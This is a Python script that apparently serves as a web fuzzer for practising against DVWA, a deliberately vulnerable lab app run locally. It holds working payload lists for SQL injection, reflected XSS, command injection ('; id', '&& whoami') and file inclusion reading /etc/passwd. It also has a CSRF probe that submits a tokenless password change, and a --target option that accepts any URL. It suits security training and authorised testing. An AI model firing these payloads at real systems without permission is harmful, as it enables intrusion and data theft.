#!/usr/bin/env python3
"""
Web application fuzzer -- tests DVWA for SQLi, XSS, Command Injection, LFI, and CSRF.

Usage:
    1. Start DVWA: docker run -d -p 80:80 vulnerables/web-dvwa
    2. Log in at http://localhost, go to Setup and click Create Database
    3. Get your PHPSESSID from browser dev tools (Application > Cookies > localhost > PHPSESSID)
    4. Run with session cookie:

       # Option A: pass on command line
       python3 fuzzer.py --session YOUR_PHPSESSID_HERE

       # Option B: set environment variable (recommended)
       export DVWA_SESSION=YOUR_PHPSESSID_HERE
       python3 fuzzer.py
"""

import argparse
import os
import re
import time
from datetime import datetime

import requests

TARGET = "http://localhost"
OUTPUT_FILE = "fuzzer_results.txt"

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT null,null-- -",
    "' UNION SELECT null,database()-- -",
    "1 AND SLEEP(3)-- -",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert('XSS')>",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "127.0.0.1; id",
    "127.0.0.1 && whoami",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SQLI_ERRORS = [
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "SQL syntax",
]


def parse_args():
    parser = argparse.ArgumentParser(description="DVWA vulnerability fuzzer")
    parser.add_argument(
        "--session",
        default=os.environ.get("DVWA_SESSION", ""),
        help="PHPSESSID cookie value (or set DVWA_SESSION env var)",
    )
    parser.add_argument(
        "--target",
        default=TARGET,
        help=f"Base URL of the target (default: {TARGET})",
    )
    parser.add_argument(
        "--output",
        default=OUTPUT_FILE,
        help=f"Output file for results (default: {OUTPUT_FILE})",
    )
    return parser.parse_args()


def build_cookies(session_id):
    if not session_id:
        raise ValueError(
            "No session ID provided. Use --session YOUR_ID or set DVWA_SESSION env var.\n"
            "Get your PHPSESSID from browser dev tools after logging in to DVWA."
        )
    return {"PHPSESSID": session_id, "security": "low"}


def log(msg, f):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    f.write(line + "\n")


def test_sqli(url, param, cookies, f):
    log(f"\n[SQLi] {url} | param={param}", f)
    found = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, cookies=cookies, timeout=8)
            elapsed = time.time() - start
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    log(f"  [VULN] Error-based SQLi -- payload: {payload}", f)
                    found.append(payload)
                    break
            if "SLEEP" in payload.upper() and elapsed > 2.5:
                log(f"  [VULN] Time-based blind SQLi -- took {elapsed:.1f}s", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No SQLi found", f)
    return found


def test_xss(url, param, cookies, f):
    log(f"\n[XSS]  {url} | param={param}", f)
    found = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=cookies, timeout=8)
            if payload in r.text:
                log(f"  [VULN] Reflected XSS -- payload reflected: {payload}", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No reflected XSS found", f)
    return found


def test_cmdi(url, param, cookies, f):
    log(f"\n[CMDI] {url} | param={param}", f)
    found = []
    for payload in CMDI_PAYLOADS:
        try:
            r = requests.post(url, data={param: payload}, cookies=cookies, timeout=8)
            for indicator in ["uid=", "root:", "www-data"]:
                if indicator in r.text:
                    log(f"  [VULN] Command injection -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No command injection found", f)
    return found


def test_lfi(url, param, cookies, f):
    log(f"\n[LFI]  {url} | param={param}", f)
    found = []
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=cookies, timeout=8)
            for indicator in ["root:x:", "daemon:", "/bin/bash"]:
                if indicator in r.text:
                    log(f"  [VULN] LFI -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No LFI found", f)
    return found


def test_csrf(url, form_fields, cookies, f):
    """
    Check whether a state-changing form includes a CSRF token.

    Strategy:
      1. GET the page and parse for a hidden token field
      2. If no token found, submit without Referer (simulates cross-origin request)
      3. If the server accepts the submission -> CSRF likely
    """
    log(f"\n[CSRF] {url}", f)
    found = []
    try:
        r = requests.get(url, cookies=cookies, timeout=8)
        token_patterns = [
            r'name=["\'\']user_token["\'\'] value=["\'\']([a-f0-9]+)["\'\']',
            r'name=["\'\']csrf_token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
            r'name=["\'\']_token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
        ]
        token_found = any(re.search(p, r.text, re.IGNORECASE) for p in token_patterns)

        if not token_found:
            log("  [WARN] No CSRF token found -- testing tokenless submission", f)
            r2 = requests.get(url, params=form_fields, cookies=cookies,
                              headers={"Referer": ""}, timeout=8)
            if r2.status_code == 200 and "login" not in r2.url.lower():
                log(f"  [VULN] CSRF likely -- server returned 200 without token", f)
                found.append(url)
            else:
                log(f"  [OK] Server rejected tokenless submission (status={r2.status_code})", f)
        else:
            log("  [OK] CSRF token present", f)
    except Exception as e:
        log(f"  [ERR] {e}", f)
    return found


def main():
    args = parse_args()
    cookies = build_cookies(args.session)
    target = args.target.rstrip("/")

    all_findings = []
    with open(args.output, "w") as f:
        log(f"Fuzzer started -- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", f)
        log(f"Target: {target}", f)

        all_findings += [("SQLi", p) for p in test_sqli(f"{target}/dvwa/vulnerabilities/sqli/", "id", cookies, f)]
        all_findings += [("XSS",  p) for p in test_xss(f"{target}/dvwa/vulnerabilities/xss_r/", "name", cookies, f)]
        all_findings += [("CMDI", p) for p in test_cmdi(f"{target}/dvwa/vulnerabilities/exec/", "ip", cookies, f)]
        all_findings += [("LFI",  p) for p in test_lfi(f"{target}/dvwa/vulnerabilities/fi/", "page", cookies, f)]

        csrf_fields = {"password_new": "csrf_test", "password_conf": "csrf_test", "Change": "Change"}
        all_findings += [("CSRF", u) for u in test_csrf(f"{target}/dvwa/vulnerabilities/csrf/", csrf_fields, cookies, f)]

        log(f"\nDone. {len(all_findings)} finding(s).", f)
        for t, p in all_findings:
            log(f"  [{t}] {p}", f)

    print(f"\nResults saved to {args.output}")


if __name__ == "__main__":
    main()
